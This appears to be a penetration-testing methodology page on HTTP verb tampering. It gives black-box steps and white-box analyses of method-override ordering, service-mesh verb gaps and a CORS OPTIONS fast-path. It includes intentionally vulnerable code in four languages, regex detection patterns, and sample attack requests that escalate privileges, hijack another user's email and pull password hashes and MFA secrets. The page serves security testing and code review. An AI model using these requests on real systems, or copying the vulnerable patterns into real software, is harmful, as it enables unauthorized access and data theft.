# HTTP Verb Tampering

## Check List

## Methodology

### Black Box

#### HTTP Tampering Bypassing Access Denied

{% stepper %}
{% step %}
Navigate to the target application in a browser.
{% endstep %}

{% step %}
Identify a functionality that is restricted to authenticated users (e.g., user deletion, admin actions).
{% endstep %}

{% step %}
Log out or ensure you are **not authenticated**.
{% endstep %}

{% step %}
Intercept a legitimate restricted request (e.g., a POST or DELETE request) using a proxy tool such as Burp Suite.
{% endstep %}

{% step %}
Observe that the original request uses a restricted HTTP method, for example

```http
POST /admin/deleteUser HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send the original request without authentication and confirm that access is denied
{% endstep %}

{% step %}
Modify the HTTP method to an alternative method such as GET or PUT

```http
GET /admin/deleteUser HTTP/1.1
Host: target.com
```
{% endstep %}

{% step %}
Send the modified request using Burp Suite Repeater
{% endstep %}

{% step %}
Observe the server response
{% endstep %}

{% step %}
If the server processes the request successfully and performs the restricted action without authentication, confirm that authentication bypass is achieved via HTTP method manipulation
{% endstep %}
{% endstepper %}

***

#### Admin Emails & Passwords Exposed via HTTP Method Change

{% stepper %}
{% step %}
Navigate to the target application
{% endstep %}

{% step %}
Access the **Email** section of the platform
{% endstep %}

{% step %}
Interact with the **Reply** feature to trigger a request
{% endstep %}

{% step %}
Intercept the outgoing request using a proxy tool (Burp Suite)
{% endstep %}

{% step %}
Observe that the request is sent to an API endpoint using the **POST** method

```http
POST /index.php/api/rest/latest/windows HTTP/1.1
```
{% endstep %}

{% step %}
Send the intercepted POST request to Burp Repeater
{% endstep %}

{% step %}
Replay the original POST request
{% endstep %}

{% step %}
Confirm that the server responds and returns a JSON response similar to

```http
HTTP/1.1 201 Created
Host: example.com
Cookie: ...
.. ..

{"id":1}
```
{% endstep %}

{% step %}
Modify the HTTP method of the same request from `POST` to `GET`
{% endstep %}

{% step %}
Send the modified GET request to the same endpoint
{% endstep %}

{% step %}
Observe the server response and Confirm that the server returns a full list of registered users ,Verify that the response contains sensitive data such as ( User IDs, Email addresses, Password hashes (or plaintext passwords)
{% endstep %}

{% step %}
Confirm that this data is accessible without proper authorization checks
{% endstep %}
{% endstepper %}

***

#### Improper PATCH Method Handling for Unauthorized User Data Modification

{% stepper %}
{% step %}
Navigate to the target application and authenticate as a **regular user** (non-admin)
{% endstep %}

{% step %}
Identify user-related API endpoints by (Reviewing JavaScript files or Inspecting network traffic in the browser Developer Tools, Enumerating hidden or undocumented paths)
{% endstep %}

{% step %}
Locate an endpoint responsible for updating user data (profile update)
{% endstep %}

{% step %}
Attempt to access or modify another user’s data using common HTTP methods such as

```http
PUT /api/users/{user_id}
POST /api/users/{user_id}
```

Confirm that the server responds with

```http
403 Forbidden
```
{% endstep %}

{% step %}
Modify the HTTP method to **PATCH**

```http
PATCH /api/users/{user_id}
```
{% endstep %}

{% step %}
Keep the same authenticated session of the regular user
{% endstep %}

{% step %}
Craft a JSON request body containing modified user data, for example

```http
{
  "email": "attacker@evil.com"
}
```
{% endstep %}

{% step %}
Send the PATCH request using a proxy tool (e.g., Burp Suite Repeater)
{% endstep %}

{% step %}
Observe the server response and Confirm that the server responds with a success status (200 OK) instead of 403 Forbidden
{% endstep %}

{% step %}
Verify that the targeted user’s data has been modified successfully
{% endstep %}
{% endstepper %}

***

### White Box

#### Privilege Escalation via Pipeline Desynchronization in Method Override Middleware

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify the architecture's approach to legacy client integration. Modern enterprise APIs utilize strict RESTful conventions (`POST`, `PUT`, `PATCH`, `DELETE`). However, legacy corporate firewalls, outdated B2B proxy servers, and primitive HTML forms often aggressively strip or block arbitrary HTTP verbs, permitting only `GET` and `POST`
{% endstep %}

{% step %}
Investigate the "Method Override" compatibility optimization. To allow legacy clients to interact with RESTful endpoints without altering the core routing logic, developers inject an upstream middleware that inspects custom headers (e.g., `X-HTTP-Method-Override`, `X-Method-Override`) or URL query parameters (e.g., `_method`)
{% endstep %}

{% step %}
Analyze the HTTP Request Pipeline in the decompiled codebase. In modern frameworks, the request traverses a strict sequence of middlewares (e.g., Logging -> Routing -> Authentication -> Authorization -> Controller)
{% endstep %}

{% step %}
Locate the exact position of the Method Override middleware within this execution pipeline
{% endstep %}

{% step %}
Discover the critical architectural desynchronization: The developer placed the Authorization middleware _before_ the Method Override middleware in the pipeline execution order
{% endstep %}

{% step %}
Understand the resulting trust boundary failure: The Authorization middleware evaluates security policies based on the _physical_ HTTP verb transmitted over the TCP socket (e.g., `POST`). Immediately afterward, the Method Override middleware mutates the HTTP context, replacing the physical verb with the attacker-controlled header (e.g., `DELETE`), before passing the request to the endpoint router
{% endstep %}

{% step %}
Identify an endpoint where the access control policies differ based on the HTTP verb. For example, a user's profile endpoint where `POST` (Update Profile) requires standard user privileges, but `DELETE` (Destroy Tenant) strictly requires Administrative privileges
{% endstep %}

{% step %}
Authenticate to the application as a low-privilege standard user
{% endstep %}

{% step %}
Construct an HTTP `POST` request targeting the sensitive endpoint
{% endstep %}

{% step %}
Inject the `X-HTTP-Method-Override: DELETE` header into the request
{% endstep %}

{% step %}
The Authorization middleware inspects the `POST` verb, determines the standard user possesses sufficient privileges, and allows the request. The subsequent Method Override middleware rewrites the internal request state to `DELETE`
{% endstep %}

{% step %}
The Controller router receives the mutated context, matches the `DELETE` verb to the destructive administrative handler, and executes the unauthorized state mutation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:app\.UseHttpMethodOverride\s*\(\s*\)|UseHttpMethodOverride\s*\(\s*\)|HttpMethodOverrideMiddleware|HttpMethodOverrideOptions|X-HTTP-Method-Override|Request\.Headers\["X-HTTP-Method-Override"\]|Request\.Method\s*=)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:HiddenHttpMethodFilter|HttpMethodFilter|request\.getHeader\s*\(\s*"X-HTTP-Method-Override"\s*\)|setMethod\s*\(|X-HTTP-Method-Override|OncePerRequestFilter[\s\S]{0,120}?setMethod)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:\$request->setMethod\s*\(\s*\$request->header\s*\(\s*'X-HTTP-Method-Override'\s*\)\s*\)|Request::setMethod|X-HTTP-Method-Override|\$_SERVER\['HTTP_X_HTTP_METHOD_OVERRIDE'\]|\$request->getMethod\s*\()
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:methodOverride\s*\(\s*['"]X-HTTP-Method-Override['"]\s*\)|method-override|req\.headers\[['"]x-http-method-override['"]\]|req\.method\s*=|app\.use\s*\(\s*methodOverride)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
app\.UseHttpMethodOverride\(\)|UseHttpMethodOverride\(\)|HttpMethodOverrideMiddleware|X-HTTP-Method-Override
```
{% endtab %}

{% tab title="Java" %}
```regexp
HiddenHttpMethodFilter|HttpMethodFilter|getHeader\("X-HTTP-Method-Override"\)|setMethod\(
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$request->setMethod\(\$request->header\('X-HTTP-Method-Override'\)\)|Request::setMethod|HTTP_X_HTTP_METHOD_OVERRIDE
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
methodOverride\('X-HTTP-Method-Override'\)|method-override|req\.headers\['x-http-method-override'\]|app\.use\(.*methodOverride
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public void Configure(IApplicationBuilder app, IWebHostEnvironment env)
{
    app.UseRouting();

    // [1]
    app.UseAuthentication();
    
    // [2]
    app.UseAuthorization();

    // [3]
    var overrideOptions = new HttpMethodOverrideOptions {
        FormFieldName = "_method"
    };
    app.UseHttpMethodOverride(overrideOptions);

    // [4]
    app.UseEndpoints(endpoints =>
    {
        endpoints.MapControllers();
    });
}
```
{% endtab %}

{% tab title="Java" %}
```java
@Configuration
public class WebSecurityConfig extends WebSecurityConfigurerAdapter {

    @Override
    protected void configure(HttpSecurity http) throws Exception {
        // [1]
        // [2]
        http.authorizeRequests()
            .antMatchers(HttpMethod.POST, "/api/v1/tenant/profile").hasRole("USER")
            .antMatchers(HttpMethod.DELETE, "/api/v1/tenant/profile").hasRole("ADMIN")
            .anyRequest().authenticated();
    }

    @Bean
    public FilterRegistrationBean<HiddenHttpMethodFilter> hiddenHttpMethodFilter() {
        FilterRegistrationBean<HiddenHttpMethodFilter> filterReg = new FilterRegistrationBean<>(new HiddenHttpMethodFilter());
        
        // [3]
        // [4]
        filterReg.setOrder(Ordered.LOWEST_PRECEDENCE); 
        return filterReg;
    }
}
```
{% endtab %}

{% tab title="PHP" %}
```php
class HttpPipelineKernel
{
    protected $middleware = [
        // [1]
        \App\Http\Middleware\Authenticate::class,
        
        // [2]
        \App\Http\Middleware\AuthorizeRoles::class,
        
        // [3]
        // [4]
        \App\Http\Middleware\MethodOverrideMiddleware::class,
        
        \Illuminate\Routing\Middleware\SubstituteBindings::class,
    ];
}

// Inside MethodOverrideMiddleware.php:
// $request->setMethod($request->header('X-HTTP-Method-Override', $request->method()));
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const express = require('express');
const methodOverride = require('method-override');
const app = express();

// [1]
app.use(authenticateToken);

// [2]
app.use('/api/v1/tenant/profile', (req, res, next) => {
    if (req.method === 'DELETE' && req.user.role !== 'ADMIN') {
        return res.status(403).send('Forbidden');
    }
    next();
});

// [3]
// [4]
app.use(methodOverride('X-HTTP-Method-Override'));

app.delete('/api/v1/tenant/profile', (req, res) => {
    tenantService.destroy(req.user.tenantId);
    res.send('Tenant destroyed');
});
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The pipeline authenticates the user and establishes their baseline identity within the HTTP context, \[2] The Authorization middleware evaluates the request. It extracts the HTTP verb directly from the raw incoming HTTP request (which is `POST`). It verifies that the user holds the requisite permissions to execute a `POST` operation on the target resource, \[3] To optimize interoperability with legacy B2B proxies that drop esoteric HTTP verbs, the developer explicitly introduces a Method Override middleware, \[4] The fatal architectural sequencing error. Because the override middleware operates _after_ the authorization check, it silently mutates the application's internal representation of the HTTP verb. The downstream endpoint router seamlessly binds the request to the highly privileged destructive controller, completely bypassing the initial security gate

```http
// 1. Attacker is a standard user, lacking permissions to execute DELETE.
// 2. Attacker crafts a standard POST request, which they are authorized to execute.
// 3. Attacker injects the Method Override header.

POST /api/v1/tenant/profile HTTP/1.1
Host: api.enterprise.tld
Authorization: Bearer <low_privilege_user_token>
X-HTTP-Method-Override: DELETE
Content-Type: application/json

{"reason": "Attacker overriding state"}
```
{% endstep %}

{% step %}
The architectural necessity to support legacy corporate firewalls mandated the implementation of HTTP Method Overrides. The enterprise framework processed the incoming request linearly. The Authorization middleware read the physical `POST` verb, evaluated the RBAC policy, and granted access based on the user's standard privileges. Following the authorization phase, the execution thread entered the override middleware, which intercepted the `X-HTTP-Method-Override: DELETE` header and structurally transformed the request context into a `DELETE` operation. The framework's internal router subsequently dispatched the request to the administrative deletion handler. The attacker achieved critical privilege escalation by exploiting the chronological desynchronization between security evaluation and context mutation
{% endstep %}
{% endstepper %}

***

#### Mesh Authorization Evasion via Polymorphic Controller Omission

{% stepper %}
{% step %}
Map the entire target system using Burp Suite
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Identify a Zero-Trust Service Mesh or centralized API Gateway architecture (e.g., Istio, Envoy, OPA, or Kong). In modern deployments, developers decouple authorization logic from the application code, lifting it into centralized YAML or Rego policy files enforced at the network edge
{% endstep %}

{% step %}
Investigate the Access Control Policy defined in the centralized mesh layer
{% endstep %}

{% step %}
Observe the "Explicit Declaration" optimization. To ensure policies are readable and maintainable, security engineers explicitly map known HTTP verbs to specific RBAC roles (e.g., `Rule: Allow, Methods: ["POST", "PUT", "DELETE"], Role: Admin`)
{% endstep %}

{% step %}
Analyze what happens to HTTP verbs that are _not_ explicitly listed in the policy (e.g., `PATCH`, `TRACE`, `TRACK`, or non-standard arbitrary verbs like `INVENTED`)
{% endstep %}

{% step %}
Determine if the mesh policy defaults to a "Fail-Open" or "Pass-Through" state for unrecognized verbs, or if an overarching generic rule (e.g., `Rule: Allow, Methods: ["GET"], Role: User`) inadvertently swallows undefined verbs due to regex or structural misconfigurations
{% endstep %}

{% step %}
Decompile the downstream microservice receiving the traffic from the mesh. Locate the critical administrative controllers
{% endstep %}

{% step %}
Discover the Polymorphic Controller optimization. In rapid Agile environments, developers frequently utilize framework annotations or routing declarations that bind an endpoint to _all_ incoming HTTP verbs simultaneously, rather than strictly defining the expected method (e.g., `@RequestMapping` instead of `@PostMapping`, or `app.all()` instead of `app.post()`)
{% endstep %}

{% step %}
Understand the catastrophic interaction between independently correct components: The Service Mesh expects the downstream service to reject invalid verbs. The downstream service expects the Service Mesh to block unauthorized traffic before it arrives
{% endstep %}

{% step %}
Construct an HTTP request targeting the highly privileged administrative endpoint
{% endstep %}

{% step %}
Manipulate the HTTP Verb. Replace the expected `POST` or `DELETE` with a valid but unmapped verb (e.g., `PATCH`), or a completely fictitious verb (e.g., `UPDATE`)
{% endstep %}

{% step %}
The Service Mesh evaluates the request, fails to match the strict administrative verb policy, and allows the request to pass through the perimeter under a baseline user context
{% endstep %}

{% step %}
The downstream polymorphic controller receives the request, ignores the HTTP verb entirely due to its universal binding, and executes the administrative state mutation

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:\[Route\s*\(\s*"api(?:/v\d+)?/admin(?:/[^"]*)?"\s*\)\]\s*public|\[Http(?:Get|Post|Put|Delete|Patch)\][\s\S]{0,120}?\[Route\s*\(\s*"api(?:/v\d+)?/admin|\[ApiController\][\s\S]{0,200}?\[Route\s*\(\s*"api(?:/v\d+)?/admin)
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:@RequestMapping\s*\([\s\S]{0,150}?value\s*=\s*["']/api(?:/v\d+)?/admin|@(?:Get|Post|Put|Delete|Patch)Mapping\s*\(\s*["']/api(?:/v\d+)?/admin|@RestController[\s\S]{0,200}?@RequestMapping)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:Route::any\s*\(\s*['"]/api(?:/v\d+)?/admin|Route::match\s*\(\s*\[[^\]]+\]\s*,\s*['"]/api(?:/v\d+)?/admin|Route::(?:get|post|put|patch|delete)\s*\(\s*['"]/api(?:/v\d+)?/admin)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:app\.all\s*\(\s*['"]/api(?:/v\d+)?/admin|router\.all\s*\(\s*['"]/api(?:/v\d+)?/admin|app\.(?:get|post|put|patch|delete)\s*\(\s*['"]/api(?:/v\d+)?/admin|router\.(?:get|post|put|patch|delete)\s*\(\s*['"]/api(?:/v\d+)?/admin)
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\[Route\("api/v\d+/admin.*"\)\]\s*public|\[Route\("api/admin.*"\)\]\s*public
```
{% endtab %}

{% tab title="Java" %}
```regexp
@RequestMapping\(.*value\s*=\s*["']/api/v\d+/admin|@(Get|Post|Put|Delete|Patch)Mapping\(["']/api/v\d+/admin
```
{% endtab %}

{% tab title="PHP" %}
```regexp
Route::any\(['"]/api/v\d+/admin|Route::match\(.*['"]/api/v\d+/admin|Route::(get|post|put|patch|delete)\(['"]/api/v\d+/admin
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
app\.all\(['"]/api/v\d+/admin|router\.all\(['"]/api/v\d+/admin|app\.(get|post|put|patch|delete)\(['"]/api/v\d+/admin
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
[ApiController]
// [1]
[Route("api/v1/admin/configuration")]
public class SystemConfigController : ControllerBase
{
    private readonly IConfigurationService _configService;

    // [2]
    // [3]
    // [4]
    [Route("update-license")] 
    public async Task<IActionResult> UpdateLicense([FromBody] LicenseDto request)
    {
        await _configService.ApplyLicenseAsync(request.LicenseKey);
        return Ok(new { status = "License Applied Globally" });
    }
}

// In Istio AuthorizationPolicy (Sidecar Proxy):
// rules:
// - to:
//   - operation:
//       methods: ["POST", "PUT", "DELETE"]
//       paths: ["/api/v1/admin/*"]
//   when:
//   - key: request.auth.claims[role]
//     values: ["Admin"]
```
{% endtab %}

{% tab title="Java" %}
```java
@RestController
// [1]
@RequestMapping("/api/v1/admin/configuration")
public class SystemConfigController {

    @Autowired
    private ConfigurationService configService;

    // [2]
    // [3]
    // [4]
    @RequestMapping(value = "/update-license") 
    public ResponseEntity<?> updateLicense(@RequestBody LicenseDto request) {
        configService.applyLicense(request.getLicenseKey());
        return ResponseEntity.ok(Map.of("status", "License Applied Globally"));
    }
}

// In OPA (Open Policy Agent) Rego Policy:
// allow {
//     input.method == "POST"
//     startswith(input.path, "/api/v1/admin/")
//     input.token.payload.role == "Admin"
// }
// default allow = true # Fallback for read-only microservices
```
{% endtab %}

{% tab title="PHP" %}
```php
// Inside routes/api.php
// [1]
// [2]
// [3]
// [4]
Route::any('/api/v1/admin/configuration/update-license', [SystemConfigController::class, 'updateLicense']);

class SystemConfigController extends Controller
{
    public function updateLicense(Request $request)
    {
        $this->configService->applyLicense($request->input('license_key'));
        return response()->json(['status' => 'License Applied Globally']);
    }
}

// In Kong API Gateway ACL Plugin Configuration:
// config.allow: 
//   - methods: ["POST", "DELETE"]
//     consumer_group: "Administrators"
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
const express = require('express');
const router = express.Router();

// [1]
// [2]
// [3]
// [4]
router.all('/api/v1/admin/configuration/update-license', async (req, res) => {
    await configService.applyLicense(req.body.license_key);
    res.json({ status: "License Applied Globally" });
});

module.exports = router;

// In Envoy RBAC Filter Configuration:
// permissions:
// - and_rules:
//     rules:
//     - header: { name: ":method", exact_match: "POST" }
//     - url_path: { path: { prefix: "/api/v1/admin/" } }
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The organization successfully decoupled authorization from the application code, enforcing RBAC entirely at the Service Mesh or API Gateway perimeter, \[2] To accelerate feature delivery, the backend developer opted for a broad routing declaration. They assumed the perimeter mesh would strictly filter out unwanted or unauthorized traffic before it ever reached the container, \[3] The architecture lacks explicit HTTP method bindings (e.g., omitting `@PostMapping` or `[HttpPost]`). The framework natively defaults to binding _all_ incoming HTTP verbs to this specific execution path, \[4] The fatal interaction between isolated systems. The mesh policy engineer mapped specific known verbs (`POST`, `PUT`, `DELETE`) to the `Admin` role. When the attacker transmits a `PATCH` request, the policy evaluates to false for the specific rule, bypassing the Admin requirement. Because the mesh defaults to allowing undefined traffic to flow to the microservices, the `PATCH` request arrives at the polymorphic controller, completely bypassing the perimeter security boundary

```http
// 1. Attacker attempts a standard POST request and is correctly blocked by the Service Mesh.
POST /api/v1/admin/configuration/update-license HTTP/1.1
Host: mesh.enterprise.tld
Authorization: Bearer <low_privilege_user_token>
Content-Type: application/json

HTTP/1.1 403 Forbidden
RBAC: Access Denied
```

```http
// 2. Attacker modifies the HTTP Verb to an unmapped but valid protocol method.
PATCH /api/v1/admin/configuration/update-license HTTP/1.1
Host: mesh.enterprise.tld
Authorization: Bearer <low_privilege_user_token>
Content-Type: application/json

{"license_key": "ATTACKER_INJECTED_BACKDOOR_LICENSE"}

// 3. The Service Mesh ignores the unmapped verb, allowing it through to the downstream service.
// 4. The polymorphic downstream controller executes the state mutation.
HTTP/1.1 200 OK
Content-Type: application/json

{"status": "License Applied Globally"}
```
{% endstep %}

{% step %}
To standardize access control across thousands of disparate microservices, the enterprise deployed a centralized Service Mesh. Security engineers explicitly defined policies restricting state-mutating verbs (`POST`, `PUT`, `DELETE`) on administrative paths to high-privileged roles. Concurrently, microservice developers optimized their routing configurations using universal method bindings, relying entirely on the mesh to filter invalid traffic. When the attacker transmitted the `PATCH` verb, the mesh's explicit policy failed to capture the anomaly, inadvertently allowing the payload through the perimeter. The downstream microservice's polymorphic router absorbed the unmapped verb, successfully binding the malicious payload to the administrative execution block. This architectural mismatch resulted in critical administrative takeover without altering the payload structure or bypassing cryptographic identity
{% endstep %}
{% endstepper %}

***

#### Preflight Exfiltration via CORS Fast-Path Middleware Leakage

{% stepper %}
{% step %}
Map the entire target system using Burp Suite. Focus intensely on rich Single Page Applications (SPAs) making cross-origin requests to a centralized GraphQL or RPC-style API Gateway
{% endstep %}

{% step %}
Draw the application's architecture and trust boundaries inside XMind
{% endstep %}

{% step %}
Decompile or reverse engineer the application according to the underlying technology stack
{% endstep %}

{% step %}
Investigate the Cross-Origin Resource Sharing (CORS) architecture. Browsers automatically transmit an `OPTIONS` preflight request before initiating a cross-origin `POST` request to complex APIs (like GraphQL)
{% endstep %}

{% step %}
Understand the engineering bottleneck: Processing thousands of `OPTIONS` requests through the entire middleware pipeline (including expensive database-backed JWT validations, tenant resolution, and rate-limiting) doubles the latency of every single frontend interaction
{% endstep %}

{% step %}
Discover the "CORS Fast-Path" optimization: To eliminate this latency, API developers implement a custom middleware at the absolute top of the pipeline. If the incoming HTTP verb is `OPTIONS`, the middleware instantly attaches the necessary `Access-Control-Allow-*` headers and bypasses the remaining security checks (e.g., `req.skipAuth = true`)
{% endstep %}

{% step %}
Analyze the execution flow of the Fast-Path. Observe the fatal programming oversight: While the developer successfully bypassed the authentication middleware, they failed to permanently halt the HTTP execution chain (e.g., omitting the `return` statement after writing the headers, or accidentally invoking `next()`)
{% endstep %}

{% step %}
Evaluate the downstream API architecture. In GraphQL or complex RPC architectures, the HTTP verb is largely semantic. The execution engine determines the action based entirely on the payload body or URL query parameters (e.g., `/graphql?query=mutation{...}`
{% endstep %}

{% step %}
Recognize the architectural collapse: The `OPTIONS` request bypasses all authentication via the Fast-Path. However, because the execution chain was not halted, the request cascades down into the GraphQL/RPC engine. The engine receives the request, ignores the HTTP verb, parses the query, and executes it
{% endstep %}

{% step %}
Send an unauthenticated `OPTIONS` request to the API endpoint
{% endstep %}

{% step %}
Inject a highly privileged data exfiltration query (or state-mutating mutation) directly into the URL query parameters or the HTTP body
{% endstep %}

{% step %}
The Fast-Path middleware detects the `OPTIONS` verb, skips the JWT validation step, and appends the CORS headers. The request continues down the pipeline
{% endstep %}

{% step %}
The GraphQL engine receives the unauthenticated request, parses the attacker's query, executes the extraction against the database, and returns the highly sensitive enterprise data seamlessly within the CORS preflight response body

**VSCode Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
\b(?:if\s*\(\s*Request\.Method\s*==\s*"OPTIONS"\s*\)\s*\{\s*Response\.Headers\.Add|if\s*\(\s*HttpMethods\.IsOptions\s*\(\s*Request\.Method\s*\)\s*\)|UseCors|UseWhen[\s\S]{0,120}?OPTIONS|Request\.Method\s*==\s*"OPTIONS"[\s\S]{0,120}?(?:return|next|Ok|StatusCode))
```
{% endtab %}

{% tab title="Java" %}
```regexp
\b(?:if\s*\(\s*request\.getMethod\(\)\.equals\s*\(\s*"OPTIONS"\s*\)\s*\)\s*\{\s*request\.setAttribute\s*\(\s*"skipAuth"|request\.getMethod\(\)\.equalsIgnoreCase\s*\(\s*"OPTIONS"\s*\)|CorsFilter[\s\S]{0,120}?OPTIONS|OncePerRequestFilter[\s\S]{0,120}?OPTIONS)
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\b(?:if\s*\(\s*\$request->isMethod\s*\(\s*'OPTIONS'\s*\)\s*\)\s*\{\s*\$skipAuth|\$request->getMethod\(\)\s*==\s*['"]OPTIONS['"]|header\s*\(\s*['"]Access-Control-Allow-Origin|OPTIONS[\s\S]{0,120}?return)
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
\b(?:if\s*\(\s*req\.method\s*===?\s*['"]OPTIONS['"]\s*\)\s*\{\s*next\s*\(\s*\)|app\.options\s*\(|router\.options\s*\(|cors\s*\(|req\.method\s*===?\s*['"]OPTIONS['"][\s\S]{0,120}?(?:return|next))
```
{% endtab %}
{% endtabs %}

**RipGrep Regex Detection**

{% tabs %}
{% tab title="C#" %}
```regexp
Request\.Method\s*==\s*"OPTIONS".*Response\.Headers\.Add|HttpMethods\.IsOptions|UseCors|OPTIONS.*(return|next|Ok)
```
{% endtab %}

{% tab title="Java" %}
```regexp
request\.getMethod\(\)\.equals\("OPTIONS"\).*skipAuth|equalsIgnoreCase\("OPTIONS"\)|CorsFilter|OncePerRequestFilter.*OPTIONS
```
{% endtab %}

{% tab title="PHP" %}
```regexp
\$request->isMethod\('OPTIONS'\).*skipAuth|\$request->getMethod\(\)\s*==\s*['"]OPTIONS['"]|OPTIONS.*return
```
{% endtab %}

{% tab title="Node.js" %}
```regexp
req\.method\s*===?\s*['"]OPTIONS['"].*next\(\)|app\.options\(|router\.options\(|cors\(
```
{% endtab %}
{% endtabs %}

**Vulnerable Code Pattern**

{% tabs %}
{% tab title="C#" %}
```csharp
public class FastCorsMiddleware 
{
    public async Task InvokeAsync(HttpContext context, RequestDelegate next) 
    {
        // [1]
        if (context.Request.Method == "OPTIONS") 
        {
            // [2]
            context.Response.Headers.Add("Access-Control-Allow-Origin", "*");
            context.Response.Headers.Add("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
            context.Response.Headers.Add("Access-Control-Allow-Headers", "Authorization, Content-Type");
            
            // [3]
            // context.Response.StatusCode = 200;
            // return; <--- DEVELOPER FORGOT TO HALT THE PIPELINE
            
            context.Items["SkipAuth"] = true;
        }

        // [4]
        await next(context);
    }
}

// Downstream in AuthMiddleware:
// if (context.Items.ContainsKey("SkipAuth")) return next(context);
```
{% endtab %}

{% tab title="Java" %}
```java
@Component
public class FastCorsInterceptor implements HandlerInterceptor {

    @Override
    public boolean preHandle(HttpServletRequest request, HttpServletResponse response, Object handler) {
        // [1]
        if ("OPTIONS".equalsIgnoreCase(request.getMethod())) {
            // [2]
            response.setHeader("Access-Control-Allow-Origin", "*");
            response.setHeader("Access-Control-Allow-Methods", "POST, GET, OPTIONS");
            response.setHeader("Access-Control-Allow-Headers", "Authorization, Content-Type");
            
            // [3]
            request.setAttribute("SkipAuth", true);
            
            // [4]
            // return false; <--- DEVELOPER FORGOT TO HALT THE PIPELINE
        }
        return true;
    }
}

// Downstream in JwtAuthFilter:
// if (Boolean.TRUE.equals(request.getAttribute("SkipAuth"))) { chain.doFilter(request, response); return; }
```
{% endtab %}

{% tab title="PHP" %}
```php
class FastCorsMiddleware 
{
    public function handle($request, Closure $next) 
    {
        // [1]
        if ($request->isMethod('OPTIONS')) 
        {
            // [2]
            // [3]
            $request->attributes->set('SkipAuth', true);
            
            // [4]
            // return response('', 200)->withHeaders([...]); <--- FORGOT TO RETURN EARLY
        }

        $response = $next($request);

        if ($request->isMethod('OPTIONS')) {
            $response->headers->set('Access-Control-Allow-Origin', '*');
        }

        return $response;
    }
}

// Downstream in AuthMiddleware:
// if ($request->attributes->get('SkipAuth')) return $next($request);
```
{% endtab %}

{% tab title="Node.js" %}
```javascript
class FastCorsMiddleware {
    static handle(req, res, next) {
        // [1]
        if (req.method === 'OPTIONS') {
            // [2]
            res.header('Access-Control-Allow-Origin', '*');
            res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
            res.header('Access-Control-Allow-Headers', 'Authorization, Content-Type');
            
            // [3]
            req.skipAuth = true;
            
            // [4]
            // res.status(200).send(); return; <--- DEVELOPER FORGOT TO HALT THE PIPELINE
        }
        
        next();
    }
}

// Downstream Auth Middleware:
// if (req.skipAuth) return next();
```
{% endtab %}
{% endtabs %}
{% endstep %}

{% step %}
\[1] The middleware identifies an incoming `OPTIONS` request generated by the browser's CORS preflight mechanism, \[2] To eliminate the performance overhead of executing expensive cryptographic JWT validations on metadata requests, the developer explicitly instructs the pipeline to skip authentication, \[3] The architecture successfully applies the requisite CORS headers to satisfy the browser's security boundaries, \[4] The fatal logical collapse. The developer omitted the necessary flow-control statement (e.g., `return`) required to terminate the HTTP response immediately after injecting the headers. The pipeline continues to cascade downward. The unauthenticated request seamlessly flows into the underlying GraphQL or RPC engine, which is notoriously agnostic to the HTTP verb, executing the requested data extraction entirely outside the security perimeter

```http
// 1. Attacker bypasses the frontend UI and connects directly to the API Gateway.
// 2. Attacker transmits an unauthenticated OPTIONS request, embedding a highly privileged GraphQL query.

OPTIONS /graphql?query=query{getAllEnterpriseUsers{id,email,passwordHash,mfaSecret}} HTTP/1.1
Host: api.enterprise.tld
Content-Type: application/json
Origin: https://attacker.com
```

```http
// 3. The API Gateway detects the OPTIONS verb, applies the CORS headers, skips Auth, and accidentally continues execution.
// 4. The GraphQL engine parses the URL query parameter, resolves the execution graph, and returns the data.

HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Methods: POST, GET, OPTIONS
Content-Type: application/json

{
  "data": {
    "getAllEnterpriseUsers": [
      {
        "id": "admin_1",
        "email": "admin@enterprise.tld",
        "passwordHash": "$2y$10$xyz...",
        "mfaSecret": "JBSWY3DPEHPK3PXP"
      }
    ]
  }
}
```
{% endstep %}

{% step %}
To optimize the frontend experience by eliminating CORS preflight latency, the backend developers implemented a fast-path middleware. This optimization successfully bypassed the heavy authentication layer for `OPTIONS` requests but failed to physically terminate the execution pipeline. Because modern GraphQL and RPC engines determine routing based on payload structure rather than the physical HTTP verb, the downstream execution context completely ignored the fact that the request was an `OPTIONS` ping. The attacker exploited this architecture by submitting a highly privileged data extraction query disguised as a preflight request. The gateway explicitly skipped the JWT validation, cascaded the request downward, and the GraphQL engine faithfully executed the query, resulting in a catastrophic, unauthenticated exfiltration of the enterprise's entire user database
{% endstep %}
{% endstepper %}

***

## Cheat Sheet
